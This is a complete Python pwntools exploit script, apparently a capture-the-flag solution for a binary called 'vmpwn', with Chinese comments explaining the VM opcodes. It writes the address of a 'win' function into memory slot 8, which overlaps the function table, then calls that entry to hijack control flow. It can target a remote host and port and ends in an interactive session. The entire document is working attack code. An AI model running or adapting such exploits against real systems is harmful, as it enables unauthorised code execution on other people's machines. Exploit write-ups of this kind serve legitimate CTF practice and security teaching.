#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./vmpwn", checksec=False)
context.log_level = "info"


def start():
    if args.REMOTE:
        if not args.HOST or not args.PORT:
            log.error("远程模式用法：python3 exp.py REMOTE HOST=目标地址 PORT=目标端口")
        return remote(args.HOST, int(args.PORT))
    return process(exe.path)


io = start()

# VM 指令：
#   0x01 <u64>  push 立即数
#   0x02 <i8>   pop 到 mem[索引]
#   0x04 <u8>   调用 funcs[索引]
# mem[8] 与 funcs[0] 重叠，因此可将 win 地址写入函数表后调用。
code = b"\x01" + p64(exe.sym.win) + b"\x02\x08" + b"\x04\x00"

io.sendlineafter(b"len> ", str(len(code)).encode())
io.sendafter(b"code> ", code)
io.interactive()
